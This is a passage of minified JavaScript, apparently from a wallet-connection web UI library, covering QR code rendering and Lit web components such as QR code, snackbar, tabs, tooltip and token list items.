0,o=i.scale||4;return{width:s,scale:s?4:o,margin:n,color:{dark:e(i.color.dark||"#000000ff"),light:e(i.color.light||"#ffffffff")},type:i.type,rendererOpts:i.rendererOpts||{}}},r.getScale=function(i,n){return n.width&&n.width>=i+n.margin*2?n.width/(i+n.margin*2):n.scale},r.getImageWidth=function(i,n){const s=r.getScale(i,n);return Math.floor((i+n.margin*2)*s)},r.qrToImageData=function(i,n,s){const o=n.modules.size,a=n.modules.data,c=r.getScale(o,s),l=Math.floor((o+s.margin*2)*c),u=s.margin*c,d=[s.color.light,s.color.dark];for(let h=0;h<l;h++)for(let f=0;f<l;f++){let p=(h*l+f)*4,g=s.color.light;if(h>=u&&f>=u&&h<l-u&&f<l-u){const w=Math.floor((h-u)/c),m=Math.floor((f-u)/c);g=d[a[w*o+m]?1:0]}i[p++]=g.r,i[p++]=g.g,i[p++]=g.b,i[p]=g.a}}}(PA)),PA}var kq;function CRe(){return kq||(kq=1,function(r){const e=Nee();function t(n,s,o){n.clearRect(0,0,s.width,s.height),s.style||(s.style={}),s.height=o,s.width=o,s.style.height=o+"px",s.style.width=o+"px"}function i(){try{return document.createElement("canvas")}catch{throw new Error("You need to specify a canvas element")}}r.render=function(s,o,a){let c=a,l=o;typeof c>"u"&&(!o||!o.getContext)&&(c=o,o=void 0),o||(l=i()),c=e.getOptions(c);const u=e.getImageWidth(s.modules.size,c),d=l.getContext("2d"),h=d.createImageData(u,u);return e.qrToImageData(h.data,s,c),t(d,l,u),d.putImageData(h,0,0),l},r.renderToDataURL=function(s,o,a){let c=a;typeof c>"u"&&(!o||!o.getContext)&&(c=o,o=void 0),c||(c={});const l=r.render(s,o,c),u=c.type||"image/png",d=c.rendererOpts||{};return l.toDataURL(u,d.quality)}}(NA)),NA}var $A={},Nq;function ERe(){if(Nq)return $A;Nq=1;const r=Nee();function e(n,s){const o=n.a/255,a=s+'="'+n.hex+'"';return o<1?a+" "+s+'-opacity="'+o.toFixed(2).slice(1)+'"':a}function t(n,s,o){let a=n+s;return typeof o<"u"&&(a+=" "+o),a}function i(n,s,o){let a="",c=0,l=!1,u=0;for(let d=0;d<n.length;d++){const h=Math.floor(d%s),f=Math.floor(d/s);!h&&!l&&(l=!0),n[d]?(u++,d>0&&h>0&&n[d-1]||(a+=l?t("M",h+o,.5+f+o):t("m",c,0),c=0,l=!1),h+1<s&&n[d+1]||(a+=t("h",u),u=0)):c++}return a}return $A.render=function(s,o,a){const c=r.getOptions(o),l=s.modules.size,u=s.modules.data,d=l+c.margin*2,h=c.color.light.a?"<path "+e(c.color.light,"fill")+' d="M0 0h'+d+"v"+d+'H0z"/>':"",f="<path "+e(c.color.dark,"stroke")+' d="'+i(u,l,c.margin)+'"/>',p='viewBox="0 0 '+d+" "+d+'"',w='<svg xmlns="http://www.w3.org/2000/svg" '+(c.width?'width="'+c.width+'" height="'+c.width+'" ':"")+p+' shape-rendering="crispEdges">'+h+f+`</svg>
`;return typeof a=="function"&&a(null,w),w},$A}var Pq;function _Re(){if(Pq)return W2;Pq=1;const r=nRe(),e=xRe(),t=CRe(),i=ERe();function n(s,o,a,c,l){const u=[].slice.call(arguments,1),d=u.length,h=typeof u[d-1]=="function";if(!h&&!r())throw new Error("Callback required as last argument");if(h){if(d<2)throw new Error("Too few arguments provided");d===2?(l=a,a=o,o=c=void 0):d===3&&(o.getContext&&typeof l>"u"?(l=c,c=void 0):(l=c,c=a,a=o,o=void 0))}else{if(d<1)throw new Error("Too few arguments provided");return d===1?(a=o,o=c=void 0):d===2&&!o.getContext&&(c=a,a=o,o=void 0),new Promise(function(f,p){try{const g=e.create(a,c);f(s(g,o,c))}catch(g){p(g)}})}try{const f=e.create(a,c);l(null,s(f,o,c))}catch(f){l(f)}}return W2.create=e.create,W2.toCanvas=n.bind(null,t.render),W2.toDataURL=n.bind(null,t.renderToDataURL),W2.toString=n.bind(null,function(s,o,a){return i.render(s,a)}),W2}var SRe=_Re();const Pee=Ss(SRe),ARe=.1,$q=2.5,bh=7;function RA(r,e,t){return r===e?!1:(r-e<0?e-r:r-e)<=t+ARe}function IRe(r,e){const t=Array.prototype.slice.call(Pee.create(r,{errorCorrectionLevel:e}).modules.data,0),i=Math.sqrt(t.length);return t.reduce((n,s,o)=>(o%i===0?n.push([s]):n[n.length-1].push(s))&&n,[])}const TRe={generate({uri:r,size:e,logoSize:t,dotColor:i="#141414"}){const n="transparent",o=[],a=IRe(r,"Q"),c=e/a.length,l=[{x:0,y:0},{x:1,y:0},{x:0,y:1}];l.forEach(({x:g,y:w})=>{const m=(a.length-bh)*c*g,x=(a.length-bh)*c*w,S=.45;for(let T=0;T<l.length;T+=1){const k=c*(bh-T*2);o.push(xe`
            <rect
              fill=${T===2?i:n}
              width=${T===0?k-5:k}
              rx= ${T===0?(k-5)*S:k*S}
              ry= ${T===0?(k-5)*S:k*S}
              stroke=${i}
              stroke-width=${T===0?5:0}
              height=${T===0?k-5:k}
              x= ${T===0?x+c*T+5/2:x+c*T}
              y= ${T===0?m+c*T+5/2:m+c*T}
            />
          `)}});const u=Math.floor((t+25)/c),d=a.length/2-u/2,h=a.length/2+u/2-1,f=[];a.forEach((g,w)=>{g.forEach((m,x)=>{if(a[w][x]&&!(w<bh&&x<bh||w>a.length-(bh+1)&&x<bh||w<bh&&x>a.length-(bh+1))&&!(w>d&&w<h&&x>d&&x<h)){const S=w*c+c/2,T=x*c+c/2;f.push([S,T])}})});const p={};return f.forEach(([g,w])=>{p[g]?p[g]?.push(w):p[g]=[w]}),Object.entries(p).map(([g,w])=>{const m=w.filter(x=>w.every(S=>!RA(x,S,c)));return[Number(g),m]}).forEach(([g,w])=>{w.forEach(m=>{o.push(xe`<circle cx=${g} cy=${m} fill=${i} r=${c/$q} />`)})}),Object.entries(p).filter(([g,w])=>w.length>1).map(([g,w])=>{const m=w.filter(x=>w.some(S=>RA(x,S,c)));return[Number(g),m]}).map(([g,w])=>{w.sort((x,S)=>x<S?-1:1);const m=[];for(const x of w){const S=m.find(T=>T.some(k=>RA(x,k,c)));S?S.push(x):m.push([x])}return[g,m.map(x=>[x[0],x[x.length-1]])]}).forEach(([g,w])=>{w.forEach(([m,x])=>{o.push(xe`
              <line
                x1=${g}
                x2=${g}
                y1=${m}
                y2=${x}
                stroke=${i}
                stroke-width=${c/($q/2)}
                stroke-linecap="round"
              />
            `)})}),o}},kRe=ge`
  :host {
    position: relative;
    user-select: none;
    display: block;
    overflow: hidden;
    aspect-ratio: 1 / 1;
    width: var(--local-size);
  }

  :host([data-theme='dark']) {
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px);
    background-color: var(--wui-color-inverse-100);
    padding: var(--wui-spacing-l);
  }

  :host([data-theme='light']) {
    box-shadow: 0 0 0 1px var(--wui-color-bg-125);
    background-color: var(--wui-color-bg-125);
  }

  :host([data-clear='true']) > wui-icon {
    display: none;
  }

  svg:first-child,
  wui-image,
  wui-icon {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translateY(-50%) translateX(-50%);
  }

  wui-image {
    width: 25%;
    height: 25%;
    border-radius: var(--wui-border-radius-xs);
  }

  wui-icon {
    width: 100%;
    height: 100%;
    color: var(--local-icon-color) !important;
    transform: translateY(-50%) translateX(-50%) scale(0.25);
  }
`;var R0=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const NRe="#3396ff";let al=class extends he{constructor(){super(...arguments),this.uri="",this.size=0,this.theme="dark",this.imageSrc=void 0,this.alt=void 0,this.arenaClear=void 0,this.farcaster=void 0}render(){return this.dataset.theme=this.theme,this.dataset.clear=String(this.arenaClear),this.style.cssText=`
     --local-size: ${this.size}px;
     --local-icon-color: ${this.color??NRe}
    `,F`${this.templateVisual()} ${this.templateSvg()}`}templateSvg(){const e=this.theme==="light"?this.size:this.size-32;return xe`
      <svg height=${e} width=${e}>
        ${TRe.generate({uri:this.uri,size:e,logoSize:this.arenaClear?0:e/4,dotColor:this.color})}
      </svg>
    `}templateVisual(){return this.imageSrc?F`<wui-image src=${this.imageSrc} alt=${this.alt??"logo"}></wui-image>`:this.farcaster?F`<wui-icon
        class="farcaster"
        size="inherit"
        color="inherit"
        name="farcaster"
      ></wui-icon>`:F`<wui-icon size="inherit" color="inherit" name="walletConnect"></wui-icon>`}};al.styles=[ht,kRe];R0([V()],al.prototype,"uri",void 0);R0([V({type:Number})],al.prototype,"size",void 0);R0([V()],al.prototype,"theme",void 0);R0([V()],al.prototype,"imageSrc",void 0);R0([V()],al.prototype,"alt",void 0);R0([V()],al.prototype,"color",void 0);R0([V({type:Boolean})],al.prototype,"arenaClear",void 0);R0([V({type:Boolean})],al.prototype,"farcaster",void 0);al=R0([me("wui-qr-code")],al);const PRe=ge`
  :host {
    position: relative;
    display: inline-block;
    width: 100%;
  }
`;var $Re=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let v7=class extends he{constructor(){super(...arguments),this.inputComponentRef=gc()}render(){return F`
      <wui-input-text
        ${mc(this.inputComponentRef)}
        placeholder="Search wallet"
        icon="search"
        type="search"
        enterKeyHint="search"
        size="sm"
      >
        <wui-input-element @click=${this.clearValue} icon="close"></wui-input-element>
      </wui-input-text>
    `}clearValue(){const t=this.inputComponentRef.value?.inputElementRef.value;t&&(t.value="",t.focus(),t.dispatchEvent(new Event("input")))}};v7.styles=[ht,PRe];v7=$Re([me("wui-search-bar")],v7);const RRe=ge`
  :host {
    display: flex;
    column-gap: var(--wui-spacing-s);
    align-items: center;
    padding: var(--wui-spacing-xs) var(--wui-spacing-m) var(--wui-spacing-xs) var(--wui-spacing-xs);
    border-radius: var(--wui-border-radius-s);
    border: 1px solid var(--wui-color-gray-glass-005);
    box-sizing: border-box;
    background-color: var(--wui-color-bg-175);
    box-shadow:
      0px 14px 64px -4px rgba(0, 0, 0, 0.15),
      0px 8px 22px -6px rgba(0, 0, 0, 0.15);

    max-width: 300px;
  }

  :host wui-loading-spinner {
    margin-left: var(--wui-spacing-3xs);
  }
`;var p2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Dd=class extends he{constructor(){super(...arguments),this.backgroundColor="accent-100",this.iconColor="accent-100",this.icon="checkmark",this.message="",this.loading=!1,this.iconType="default"}render(){return F`
      ${this.templateIcon()}
      <wui-text variant="paragraph-500" color="fg-100" data-testid="wui-snackbar-message"
        >${this.message}</wui-text
      >
    `}templateIcon(){return this.loading?F`<wui-loading-spinner size="md" color="accent-100"></wui-loading-spinner>`:this.iconType==="default"?F`<wui-icon size="xl" color=${this.iconColor} name=${this.icon}></wui-icon>`:F`<wui-icon-box
      size="sm"
      iconSize="xs"
      iconColor=${this.iconColor}
      backgroundColor=${this.backgroundColor}
      icon=${this.icon}
      background="opaque"
    ></wui-icon-box>`}};Dd.styles=[ht,RRe];p2([V()],Dd.prototype,"backgroundColor",void 0);p2([V()],Dd.prototype,"iconColor",void 0);p2([V()],Dd.prototype,"icon",void 0);p2([V()],Dd.prototype,"message",void 0);p2([V()],Dd.prototype,"loading",void 0);p2([V()],Dd.prototype,"iconType",void 0);Dd=p2([me("wui-snackbar")],Dd);const ORe=ge`
  :host {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-s);
    border: 1px solid var(--wui-color-dark-glass-100);
    box-sizing: border-box;
    background-color: var(--wui-color-bg-325);
    box-shadow: 0px 0px 16px 0px rgba(0, 0, 0, 0.25);
  }

  wui-flex {
    width: 100%;
  }

  wui-text {
    word-break: break-word;
    flex: 1;
  }

  .close {
    cursor: pointer;
  }

  .icon-box {
    height: 40px;
    width: 40px;
    border-radius: var(--wui-border-radius-3xs);
    background-color: var(--local-icon-bg-value);
  }
`;var S4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let fp=class extends he{constructor(){super(...arguments),this.message="",this.backgroundColor="accent-100",this.iconColor="accent-100",this.icon="info"}render(){return this.style.cssText=`
      --local-icon-bg-value: var(--wui-color-${this.backgroundColor});
   `,F`
      <wui-flex flexDirection="row" justifyContent="space-between" alignItems="center">
        <wui-flex columnGap="xs" flexDirection="row" alignItems="center">
          <wui-flex
            flexDirection="row"
            alignItems="center"
            justifyContent="center"
            class="icon-box"
          >
            <wui-icon color=${this.iconColor} size="md" name=${this.icon}></wui-icon>
          </wui-flex>
          <wui-text variant="small-500" color="bg-350" data-testid="wui-alertbar-text"
            >${this.message}</wui-text
          >
        </wui-flex>
        <wui-icon
          class="close"
          color="bg-350"
          size="sm"
          name="close"
          @click=${this.onClose}
        ></wui-icon>
      </wui-flex>
    `}onClose(){md.close()}};fp.styles=[ht,ORe];S4([V()],fp.prototype,"message",void 0);S4([V()],fp.prototype,"backgroundColor",void 0);S4([V()],fp.prototype,"iconColor",void 0);S4([V()],fp.prototype,"icon",void 0);fp=S4([me("wui-alertbar")],fp);const BRe=ge`
  :host {
    display: inline-flex;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-3xl);
    padding: var(--wui-spacing-3xs);
    position: relative;
    height: 36px;
    min-height: 36px;
    overflow: hidden;
  }

  :host::before {
    content: '';
    position: absolute;
    pointer-events: none;
    top: 4px;
    left: 4px;
    display: block;
    width: var(--local-tab-width);
    height: 28px;
    border-radius: var(--wui-border-radius-3xl);
    background-color: var(--wui-color-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    transform: translateX(calc(var(--local-tab) * var(--local-tab-width)));
    transition: transform var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color, opacity;
  }

  :host([data-type='flex'])::before {
    left: 3px;
    transform: translateX(calc((var(--local-tab) * 34px) + (var(--local-tab) * 4px)));
  }

  :host([data-type='flex']) {
    display: flex;
    padding: 0px 0px 0px 12px;
    gap: 4px;
  }

  :host([data-type='flex']) > button > wui-text {
    position: absolute;
    left: 18px;
    opacity: 0;
  }

  button[data-active='true'] > wui-icon,
  button[data-active='true'] > wui-text {
    color: var(--wui-color-fg-100);
  }

  button[data-active='false'] > wui-icon,
  button[data-active='false'] > wui-text {
    color: var(--wui-color-fg-200);
  }

  button[data-active='true']:disabled,
  button[data-active='false']:disabled {
    background-color: transparent;
    opacity: 0.5;
    cursor: not-allowed;
  }

  button[data-active='true']:disabled > wui-text {
    color: var(--wui-color-fg-200);
  }

  button[data-active='false']:disabled > wui-text {
    color: var(--wui-color-fg-300);
  }

  button > wui-icon,
  button > wui-text {
    pointer-events: none;
    transition: color var(--wui-e ase-out-power-1) var(--wui-duration-md);
    will-change: color;
  }

  button {
    width: var(--local-tab-width);
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color;
  }

  :host([data-type='flex']) > button {
    width: 34px;
    position: relative;
    display: flex;
    justify-content: flex-start;
  }

  button:hover:enabled,
  button:active:enabled {
    background-color: transparent !important;
  }

  button:hover:enabled > wui-icon,
  button:active:enabled > wui-icon {
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-lg);
    color: var(--wui-color-fg-125);
  }

  button:hover:enabled > wui-text,
  button:active:enabled > wui-text {
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-lg);
    color: var(--wui-color-fg-125);
  }

  button {
    border-radius: var(--wui-border-radius-3xl);
  }
`;var Ip=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let wu=class extends he{constructor(){super(...arguments),this.tabs=[],this.onTabChange=()=>null,this.buttons=[],this.disabled=!1,this.localTabWidth="100px",this.activeTab=0,this.isDense=!1}render(){return this.isDense=this.tabs.length>3,this.style.cssText=`
      --local-tab: ${this.activeTab};
      --local-tab-width: ${this.localTabWidth};
    `,this.dataset.type=this.isDense?"flex":"block",this.tabs.map((e,t)=>{const i=t===this.activeTab;return F`
        <button
          ?disabled=${this.disabled}
          @click=${()=>this.onTabClick(t)}
          data-active=${i}
          data-testid="tab-${e.label?.toLowerCase()}"
        >
          ${this.iconTemplate(e)}
          <wui-text variant="small-600" color="inherit"> ${e.label} </wui-text>
        </button>
      `})}firstUpdated(){this.shadowRoot&&this.isDense&&(this.buttons=[...this.shadowRoot.querySelectorAll("button")],setTimeout(()=>{this.animateTabs(0,!0)},0))}iconTemplate(e){return e.icon?F`<wui-icon size="xs" color="inherit" name=${e.icon}></wui-icon>`:null}onTabClick(e){this.buttons&&this.animateTabs(e,!1),this.activeTab=e,this.onTabChange(e)}animateTabs(e,t){const i=this.buttons[this.activeTab],n=this.buttons[e],s=i?.querySelector("wui-text"),o=n?.querySelector("wui-text"),a=n?.getBoundingClientRect(),c=o?.getBoundingClientRect();i&&s&&!t&&e!==this.activeTab&&(s.animate([{opacity:0}],{duration:50,easing:"ease",fill:"forwards"}),i.animate([{width:"34px"}],{duration:500,easing:"ease",fill:"forwards"})),n&&a&&c&&o&&(e!==this.activeTab||t)&&(this.localTabWidth=`${Math.round(a.width+c.width)+6}px`,n.animate([{width:`${a.width+c.width}px`}],{duration:t?0:500,fill:"forwards",easing:"ease"}),o.animate([{opacity:1}],{duration:t?0:125,delay:t?0:200,fill:"forwards",easing:"ease"}))}};wu.styles=[ht,fr,BRe];Ip([V({type:Array})],wu.prototype,"tabs",void 0);Ip([V()],wu.prototype,"onTabChange",void 0);Ip([V({type:Array})],wu.prototype,"buttons",void 0);Ip([V({type:Boolean})],wu.prototype,"disabled",void 0);Ip([V()],wu.prototype,"localTabWidth",void 0);Ip([te()],wu.prototype,"activeTab",void 0);Ip([te()],wu.prototype,"isDense",void 0);wu=Ip([me("wui-tabs")],wu);const MRe=ge`
  :host {
    display: block;
  }

  :host > button {
    gap: var(--wui-spacing-xxs);
    padding: var(--wui-spacing-xs);
    padding-right: var(--wui-spacing-1xs);
    height: 40px;
    border-radius: var(--wui-border-radius-l);
    background: var(--wui-color-gray-glass-002);
    border-width: 0px;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
  }

  :host > button wui-image {
    width: 24px;
    height: 24px;
    border-radius: var(--wui-border-radius-s);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }
`;var FR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let jw=class extends he{constructor(){super(...arguments),this.text=""}render(){return F`
      <button>
        ${this.tokenTemplate()}
        <wui-text variant="paragraph-600" color="fg-100">${this.text}</wui-text>
      </button>
    `}tokenTemplate(){return this.imageSrc?F`<wui-image src=${this.imageSrc}></wui-image>`:F`
      <wui-icon-box
        size="sm"
        iconColor="fg-200"
        backgroundColor="fg-300"
        icon="networkPlaceholder"
      ></wui-icon-box>
    `}};jw.styles=[ht,fr,MRe];FR([V()],jw.prototype,"imageSrc",void 0);FR([V()],jw.prototype,"text",void 0);jw=FR([me("wui-token-button")],jw);const DRe=ge`
  :host {
    display: block;
    padding: 9px var(--wui-spacing-s) 10px var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xxs);

    color: var(--wui-color-bg-100);
    position: relative;
  }

  :host([data-variant='shade']) {
    background-color: var(--wui-color-bg-150);
    border: 1px solid var(--wui-color-gray-glass-005);
  }

  :host([data-variant='shade']) > wui-text {
    color: var(--wui-color-fg-150);
  }

  :host([data-variant='fill']) {
    background-color: var(--wui-color-fg-100);
    border: none;
  }

  wui-icon {
    position: absolute;
    width: 12px !important;
    height: 4px !important;
  }

  wui-icon[data-placement='top'] {
    bottom: 0px;
    left: 50%;
    transform: translate(-50%, 95%);
  }

  wui-icon[data-placement='bottom'] {
    top: 0;
    left: 50%;
    transform: translate(-50%, -95%) rotate(180deg);
  }

  wui-icon[data-placement='right'] {
    top: 50%;
    left: 0;
    transform: translate(-65%, -50%) rotate(90deg);
  }

  wui-icon[data-placement='left'] {
    top: 50%;
    right: 0%;
    transform: translate(65%, -50%) rotate(270deg);
  }
`;var AC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ag=class extends he{constructor(){super(...arguments),this.placement="top",this.variant="fill",this.message=""}render(){return this.dataset.variant=this.variant,F`<wui-icon
        data-placement=${this.placement}
        color="fg-100"
        size="inherit"
        name=${this.variant==="fill"?"cursor":"cursorTransparent"}
      ></wui-icon>
      <wui-text color="inherit" variant="small-500">${this.message}</wui-text>`}};ag.styles=[ht,fr,DRe];AC([V()],ag.prototype,"placement",void 0);AC([V()],ag.prototype,"variant",void 0);AC([V()],ag.prototype,"message",void 0);ag=AC([me("wui-tooltip")],ag);const LRe=ge`
  :host {
    height: 60px;
    min-height: 60px;
  }

  :host > wui-flex {
    cursor: pointer;
    height: 100%;
    display: flex;
    column-gap: var(--wui-spacing-s);
    padding: var(--wui-spacing-xs);
    padding-right: var(--wui-spacing-l);
    width: 100%;
    background-color: transparent;
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
    transition:
      background-color var(--wui-ease-out-power-1) var(--wui-duration-lg),
      opacity var(--wui-ease-out-power-1) var(--wui-duration-lg);
    will-change: background-color, opacity;
  }

  @media (hover: hover) and (pointer: fine) {
    :host > wui-flex:hover {
      background-color: var(--wui-color-gray-glass-002);
    }

    :host > wui-flex:active {
      background-color: var(--wui-color-gray-glass-005);
    }
  }

  :host([disabled]) > wui-flex {
    opacity: 0.6;
  }

  :host([disabled]) > wui-flex:hover {
    background-color: transparent;
  }

  :host > wui-flex > wui-flex {
    flex: 1;
  }

  :host > wui-flex > wui-image,
  :host > wui-flex > .token-item-image-placeholder {
    width: 40px;
    max-width: 40px;
    height: 40px;
    border-radius: var(--wui-border-radius-3xl);
    position: relative;
  }

  :host > wui-flex > .token-item-image-placeholder {
    display: flex;
    align-items: center;
    justify-content: center;
  }

  :host > wui-flex > wui-image::after,
  :host > wui-flex > .token-item-image-placeholder::after {
    position: absolute;
    content: '';
    inset: 0;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
    border-radius: var(--wui-border-radius-l);
  }

  button > wui-icon-box[data-variant='square-blue'] {
    border-radius: var(--wui-border-radius-3xs);
    position: relative;
    border: none;
    width: 36px;
    height: 36px;
  }
`;var Tp=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let bu=class extends he{constructor(){super(),this.observer=new IntersectionObserver(()=>{}),this.imageSrc=void 0,this.name=void 0,this.symbol=void 0,this.price=void 0,this.amount=void 0,this.visible=!1,this.imageError=!1,this.observer=new IntersectionObserver(e=>{e.forEach(t=>{t.isIntersecting?this.visible=!0:this.visible=!1})},{threshold:.1})}firstUpdated(){this.observer.observe(this)}disconnectedCallback(){this.observer.disconnect()}render(){if(!this.visible)return null;const e=this.amount&&this.price?Tr.multiply(this.price,this.amount)?.toFixed(3):null;return F`
      <wui-flex alignItems="center">
        ${this.visualTemplate()}
        <wui-flex flexDirection="column" gap="3xs">
          <wui-flex justifyContent="space-between">
            <wui-text variant="paragraph-500" color="fg-100" lineClamp="1">${this.name}</wui-text>
            ${e?F`
                  <wui-text variant="paragraph-500" color="fg-100">
                    $${Wt.formatNumberToLocalString(e,3)}
                  </wui-text>
                `:null}
          </wui-flex>
          <wui-flex justifyContent="space-between">
            <wui-text variant="small-400" color="fg-200" lineClamp="1">${this.symbol}</wui-text>
            ${this.amount?F`<wui-text variant="small-400" color="fg-200">
                  ${Wt.formatNumberToLocalString(this.amount,4)}
                </wui-text>`:null}
          </wui-flex>
        </wui-flex>
      </wui-flex>
    `}visualTemplate(){return this.imageError?F`<wui-flex class="token-item-image-placeholder">
        <wui-icon name="image" color="inherit"></wui-icon>
      </wui-flex>`:this.imageSrc?F`<wui-image
        width="40"
        height="40"
        src=${this.imageSrc}
        @onLoadError=${this.imageLoadError}
      ></wui-image>`:null}imageLoadError(){this.imageError=!0}};bu.styles=[ht,fr,LRe];Tp([V()],bu.prototype,"imageSrc",void 0);Tp([V()],bu.prototype,"name",void 0);Tp([V()],bu.prototype,"symbol",void 0);Tp([V()],bu.prototype,"price",void 0);Tp([V()],bu.prototype,"amount",void 0);Tp([te()],bu.prototype,"visible",void 0);Tp([te()],bu.prototype,"imageError",void 0);bu=Tp([me("wui-token-list-item")],bu);const URe=ge`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--wui-icon-box-size-xl);
    height: var(--wui-icon-box-size-xl);
    box-shadow: 0 0 0 8px var(--wui-thumbnail-border);
    border-radius: var(--local-border-radius);
    overflow: hidden;
  }

  wui-icon {
    width: 32px;
    height: 32px;
  }
`;var IC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let cg=class extends he{render(){return this.style.cssText=`--local-border-radius: ${this.borderRadiusFull?"1000px":"20px"}; background-color: var(--wui-color-modal-bg);`,F`${this.templateVisual()}`}templateVisual(){return this.imageSrc?F`<wui-image src=${this.imageSrc} alt=${this.alt??""}></wui-image>`:F`<wui-icon
      data-parent-size="md"
      size="inherit"
      color="inherit"
      name="walletPlaceholder"
    ></wui-icon>`}};cg.styles=[ht,URe];IC([V()],cg.prototype,"imageSrc",void 0);IC([V()],cg.prototype,"alt",void 0);IC([V({type:Boolean})],cg.prototype,"borderRadiusFull",void 0);cg=IC([me("wui-visual-thumbnail")],cg);const jRe=ge`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  :host > button {
    min-width: 40px;
    display: inline-flex;
    justify-content: center;
    align-items: center;
    background-color: var(--wui-wallet-button-bg);
    column-gap: var(--wui-spacing-2xs);
    border-radius: var(--wui-border-radius-s);
    border: 1px solid var(--wui-color-gray-glass-002);
    height: var(--wui-spacing-3xl);
    padding: var(--wui-spacing-xs) var(--wui-spacing-m) var(--wui-spacing-xs) var(--wui-spacing-xs);
    box-shadow:
      0px 8px 22px -6px var(--wui-color-gray-glass-010),
      0px 14px 64px -4px var(--wui-color-gray-glass-010);
  }

  :host > button > wui-text {
    text-transform: capitalize;
  }

  :host > button > wui-image {
    height: 24px;
    width: 24px;
    border-radius: var(--wui-border-radius-s);
  }

  :host([data-error='true']) > button {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  /* -- Disabled state --------------------------------------------------- */
  :host > button:disabled {
    cursor: default;
  }

  :host > button:disabled > wui-icon {
    filter: grayscale(1);
  }
`;var O0=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let cl=class extends he{constructor(){super(...arguments),this.imageSrc="",this.name="",this.walletConnect=!1,this.loading=!1,this.error=!1,this.disabled=!1,this.shake=!1}render(){return this.dataset.error=`${this.error}`,F`
      <button ?disabled=${this.disabled}>
